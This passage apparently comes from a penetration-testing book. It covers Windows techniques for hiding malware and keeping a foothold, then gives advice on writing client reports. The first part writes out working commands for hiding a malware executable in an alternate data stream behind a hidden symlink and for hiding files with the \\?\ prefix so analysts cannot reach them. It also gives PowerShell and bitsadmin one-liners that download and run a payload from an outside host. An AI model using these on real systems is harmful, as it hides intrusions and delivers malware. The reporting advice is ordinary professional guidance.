
## ADS Persistence and File Hiding Techniques

### Creating a Dummy File
First, we’d have to create a dummy file. In this case we are going to put the words “hi” into the document `hi.txt`.

```
echo “hi” > hi.txt
```

### Hiding Malware in Alternate Data Stream (ADS)
Next, we are going to hide our `malware.exe` file in the text file we just created.

```
type C:\Users\Workshop\Desktop\malware.exe > hi.txt:malware.exe
```

### Verifying ADS Content
If we try to read the `hi.txt` file, we just read the contents in the file, not the malware.

```
type hi.txt
```

### Creating a Symbolic Link (Windows 7+)
Again, because Windows 7 made changes, normal ADS commands don’t work. We need to create a Symbolic Link to the file. This Symbolic Link file will be called `malwareSymlink.exe`.

```
mklink malwareSymlink.exe C:\Users\Workshop\Desktop\hi.txt:malware.exe
```

### Hiding the Symbolic Link
Because the Symbolic Link will show up for all directory listings and within Windows Explorer, we need to enable the hidden attribute on the file. This will remove it for most normal user setups.

```
attrib +h /L malwareSymlink.exe
```

If we look at a directory listing, `malwareSymlink.exe` doesn’t exist, but if we execute the Symbolic Link file, the malware will execute.

![Figure 146 - ADS for Windows 7 and Higher](images/00244.jpeg)

There are better ways to keep persistence, but ADS is just another way to hide on systems that might be actively investigated.

### Hiding Files Using the `\\?\` Trick
Mark Baggett showed a cool trick where you can hide or lock out files by using the `\\?\` trick. It’s best to see an example of how this works and why it can be useful.

#### Creating a Restricted Directory
First we create a folder under `C:\tmp`. We try to create the folder “..”, which by default Windows does not allow.

```
mkdir \\?\c:\tmp\"..
```

#### Moving Malware into the Directory
Next we move our malware file into that directory.

```
move malware.exe "\\?\c:\tmp\.. \
```

If we go to the `tmp` directory, we can see a folder “..”. If in a command line, we try to go into the folder `..`, because the command `cd ..` means to go backwards a directory, we won’t be able to enter that directory.

#### Retrieving the Malware
We can always get our malware out of that directory with the command:

```
copy "\\?c:\tmp\.. \malware.exe" .
```

![Figure 147 - Hiding Files](images/00246.jpeg)
![Figure 148 - Hiding Files](images/00247.jpeg)

If we try to delete, modify, or run the executable from Windows Explorer, we get denied due to the location of the file. This is a great place to hide files, alternate data streams, and make it hard for analysts to figure out what you are doing.

![Figure 149 - Access Denied](images/00248.jpeg)

### File Transfer Methods (Windows 7/8)
On Windows 7 and 8, a better way to get files on a host is using `bitsadmin` or using PowerShell. Using `bitsadmin` is great because it is used for Windows updates and it’s using IE proxy settings. If the organization has a web proxy that requires AD credentials, this is a way to get around it.

#### PowerShell
(Check the Post Exploitation with PowerSploit section for more details)

```
cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.securepla.net/malware.exe','malware.exe');(New-Object -com Shell.Application).ShellExecute('malware.exe')"
```

#### Bitsadmin
```
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.securepla.net/malware.exe c:\malware.exe & start malware.exe"
```

![Figure 150 - File Transfer Commands](images/00249.jpeg)

## Reporting Best Practices

The final customer delivered report is really the only thing that will matter to the client. Out of everything I’ve discussed in this book, the report is how you the penetration tester get paid and asked to come back. This is by far the most important aspect of your test. You need to be able to explain the findings, rate the vulnerabilities, and explain how real-world the results are to the customer.

If you’ve ever had multiple penetration testers assess your network, you’ll find that the reports will vary based on who is performing the test. You’ll find some companies that re-template a vulnerability scanner report and from other companies you’ll find a report that is well detailed and provides repeatable steps. What I really find lacking value is when a report states that you have 100 Apache/PHP findings which are critical, but the testers can’t validate whether they are real findings based on the vulnerability or based on the banner version.

Since the report is really an adaptation of how you want to present your findings, I won’t show you my templates, but give you some hints and best practices that I’ve learned from many years of testing.

![Reporting Overview](images/00250.jpeg)

When I used to teach, I would emphasize reporting as the most important factor to a successful penetration test. It doesn’t matter whether you’ve popped 3 or 300 boxes, if you don’t tell the customer exactly what you did or if you don’t help the customer understand the mitigations to resolve the issues.

If you want to see what an example report should look like, you can look at the Offensive Security sample report. [http://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf](http://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf)

![Sample Report Reference](images/00251.jpeg)

### Key Reporting Guidelines

#### Do Not Submit Scanner Reports
*   Do not submit a Nexpose or Nessus report that has been re-titled.
    *   I can’t stress this enough; use your own template and validate your findings.
    *   Do not ever give your clients a Nexpose or Nessus report as the final report.

#### Rating Vulnerabilities Consistently
*   Rating your vulnerabilities.
    *   Make sure you figure out a way to consistently rate your vulnerabilities.
    *   I have built my own matrix that includes references from NIST, DISA, CVSS, and personal experience to set rating to vulnerabilities.
    *   The matrix includes increasing or decreasing severity based on internal/external findings, if exploit code is available, how widespread their systems are, what exploits can lead to, and how it affects the CIA security triangle.
    *   Vulnerabilities that go through my matrix will always have the same criticality level. If a client asks how I scored a rating for a vulnerability, I can reference my matrix.

#### Theoretical vs. Real Findings
*   Theoretical vs. Real Findings.
    *   I generally do not like marking findings as critical if they are only theoretical and no actual exploit is available or known. These should still definitely be findings, but I will generally lower the rating if I can’t find any avenue to exploit the host.
    *   This gives the client help properly identifying which findings need immediate attention versus those that can be applied during a regular change control window.

#### Solutions Are Critical
*   Solutions are just as important as the findings.
    *   If you use a tool to compromise a network, you have to have a solution to stop it.
    *   If you don’t have a solution, help the client develop a mitigation strategy.

#### Accurate Rating of Secure Flag/HTTP Only Findings
*   Don’t mis-rate Secure Flag/HTTP Only findings if they aren’t issues.
    *   There are some cookies that are not used for session tokens and may not provide an attacker with any additional attack surface. Although these should still be reported, they should be at a much lower rating than those used to track session state.
    *   This is just an example to enforce the idea of making sure to properly understand vulnerabilities.

#### Validate Findings
*   Make sure vulnerabilities are actual vulnerabilities.
    *   I don’t know how many times I’ve received penetration testing results telling me my systems had PHP exploits on them. This is because the scanner, based on version, alerted them of these critical findings. Some of the findings state that they are PHP CGI issues or an Apache mod security issues. The problem is my servers don’t run the CGI scripts, but the scanner identified the issue just solely based on versioning. Please make sure that you validate that findings are actual findings.
